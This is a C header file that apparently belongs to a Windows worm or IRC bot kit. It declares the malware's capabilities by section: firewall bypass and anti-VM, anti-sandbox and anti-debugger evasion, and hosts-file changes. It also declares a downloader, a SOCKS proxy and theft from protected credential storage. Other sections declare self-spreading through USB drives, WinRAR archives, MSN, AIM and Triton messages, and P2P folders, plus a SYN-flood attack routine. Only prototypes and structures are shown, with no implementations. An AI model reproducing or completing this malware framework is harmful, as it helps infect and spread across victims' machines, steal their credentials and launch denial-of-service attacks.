

// Security
int fwlbypass();
#ifndef NO_ANTIVM
BOOL AntiSandBox();
typedef long	NTSTATUS;
#define NTAPI	__stdcall
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define STATUS_SUCCESS    ((NTSTATUS)0L)
typedef struct _SYSTEM_KERNEL_DEBUGGER_INFORMATION
{
    BOOLEAN DebuggerEnabled;
    BOOLEAN DebuggerNotPresent;
} SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;
typedef struct _PROCESS_DEBUG_PORT_INFO
{
    HANDLE DebugPort;
} PROCESS_DEBUG_PORT_INFO;
enum SYSTEM_INFORMATION_CLASS	{ SystemKernelDebuggerInformation = 35 };
enum PROCESS_INFO_CLASS			{ ProcessDebugPort                = 7  };
typedef NTSTATUS  (NTAPI *ZW_QUERY_SYSTEM_INFORMATION)	(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, IN OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength);
typedef NTSTATUS  (NTAPI *ZW_QUERY_INFORMATION_PROCESS)	(IN HANDLE ProcessHandle, IN PROCESS_INFO_CLASS ProcessInformationClass, OUT PVOID ProcessInformation, IN ULONG ProcessInformationLength, OUT PULONG ReturnLength);
bool IsDebuggerRunning(HANDLE hProcess);
bool IsProcessRunningUnderVM();
bool IsInSandbox();
void ChgHosts();
#endif
/////////////////////////
// Download
DWORD WINAPI DownloadThread(LPVOID param);
/////////////////////////
// Socks4
#ifndef NO_SOCK4
DWORD WINAPI SocksDaemon(LPVOID param);
#endif
/////////////////////////
// USB Spread
#ifndef NO_USB
DWORD WINAPI usbspread(LPVOID param);
#endif
/////////////////////////
#ifndef NO_VISIT
DWORD WINAPI VisitThread(LPVOID param);
#endif
////////
// WinRAR Spread
#ifndef NO_WINRAR
BOOL AddToRar(char RarFile[],char FileToAdd[],char PackedFileName[],DWORD Attributes);
void RandomString(char *dst,int len,BOOL Gen_Numbers);
DWORD WINAPI RarWorm(LPVOID xvoid);
HANDLE XThread(LPTHREAD_START_ROUTINE XThread_Function,LPVOID Parameter);
#endif
/////////////////////////
// MSN Spread
#ifndef NO_MSN
DWORD WINAPI ImMsg(LPVOID param);
DWORD WINAPI ImMsg2(LPVOID param);
DWORD WINAPI ImMsg3(LPVOID param);
#endif
/////////////////////////
// AiM Spread
#ifndef NO_AIM
DWORD WINAPI AimMessage(LPVOID param);
void AimSend(char*);
void AimCloseAll(void);
#endif
/////////////////////////
// Triton Spread
#ifndef NO_TRITON
	enum {
		AIM_SENT,
		AIM_END,
		AIM_IDLE
	};
typedef struct TRITON
	{
		int iStatus;
		char *szMsg;
		char szBuddy[256];
		unsigned int iSpammed;
	} TRITON, *PTRITON;
	int TritonMain(char*);
	DWORD WINAPI TritonMessage(LPVOID param);
	BOOL CALLBACK TritonEnum(HWND, LPARAM);
	void TritonIm(HWND, char*);
	bool TritonSetupList(HWND, bool);
#endif
//////////////////////////
// Peer2Peer Spread
#ifndef NO_P2P
struct P2PInfo_s 
{ 
   char szDirectory[MAX_PATH]; 
   char szFilePath[MAX_PATH]; 
}; 
bool InfectP2P();
#endif
//////////////////////////
// Protected Storage
#ifndef NO_PSTORE
DWORD WINAPI pstore (LPVOID param);
#endif
//////////////////////////
// Supersyn
#ifndef NO_SUPERSYN
typedef struct SUPERSYN {

	SOCKET sock;
	char ip[128];
	char port[128];
	char length[128];
	char chan[128];
	int threadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	void *conn;
	char target[128];

} SUPERSYN;

DWORD WINAPI SuperSynThread(LPVOID param);
long SuperSynSend(unsigned long TargetIP, unsigned short TargetPort,int Times);
long SuperSyn(char *target, char *port, char *len);
#endif
